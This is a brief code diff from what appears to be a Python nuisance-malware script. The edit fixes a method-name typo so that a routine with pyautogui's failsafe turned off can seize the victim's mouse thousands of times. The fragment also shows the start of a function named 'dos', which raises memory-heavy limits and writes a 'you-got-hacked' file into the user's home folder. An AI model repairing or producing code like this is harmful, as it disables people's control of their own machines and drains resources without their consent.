@@ -19,7 +19,7 @@ def pyauto():
     py.FAILSAFE = False
     x = 1000 * 30
     for i in range(x):
-        py.MoveTo(0, 0, duration=0.001)
+        py.moveTo(0, 0, duration=0.001)
 def dos():
     sys.set_int_max_str_digits(1_000_000_000)
     with open(f'{os.path.expanduser("~")}{os.sep}you-got-hacked.virabyte', 'w') as f:
